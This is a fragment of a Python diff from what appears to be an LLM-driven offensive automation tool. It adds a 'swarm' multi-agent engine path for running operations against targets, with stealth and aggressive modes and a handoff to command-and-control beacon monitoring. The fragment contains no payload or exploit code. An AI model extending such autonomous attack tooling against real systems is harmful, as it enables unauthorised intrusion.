+                    " (visibili ora anche nel core manuale)")
+            _print_swarm_tail(result, summary, out_root, started_wall,
+                              goal, on_event, handoff_c2)
+            return
+        if engine == "swarm":
+            notifier.warn(f"Swarm has no chain for goal '{goal}': agent path")
         state_path = resume or os.path.join(out_root, "checkpoint.json")
         result, agent = _run_agent_single(
             resolved[0], goal, profile, aggressive, stealth, speed,
@@ -1305,6 +921,30 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                           "Usa 'c2' -> 'beacons' per monitorare callback")
         return
 
+    if engine == "swarm" and goal in _GOAL_CHAIN:
+        for _flag, _name in ((resume, "--resume"),
+                             (experience, "--experience"),
+                             (evolution, "--evolution")):
+            if _flag:
+                notifier.warn(
+                    f"{_name} ignorato sullo swarm path "
+                    f"(checkpoint/evolution sono del path agent)")
+        notifier.success("=" * 25 + " PHANTOM AUTO-MODE (swarm) " + "=" * 25)
+        result, summary, merged = _run_swarm_operation(
+            resolved, goal, profile, aggressive, speed, agents,
+            verbose, on_event, llm)
+        _write_swarm_summary(summary, out_root, ",".join(resolved))
+        if merged:
+            for t, counts in merged.items():
+                if counts:
+                    notifier.info(
+                        f"Core sync [{t}]: " + ", ".join(
+                            f"{k}={v}" for k, v in sorted(counts.items())))
+        _print_swarm_tail(result, summary, out_root, started_wall,
+                          goal, on_event, handoff_c2)
+        return
+    if engine == "swarm":
+        notifier.warn(f"Swarm has no chain for goal '{goal}': agent path")
     campaign = _run_agent_campaign(
         resolved, goal, profile, aggressive, stealth, speed,
         scope_list, agents, verbose, on_event, llm,
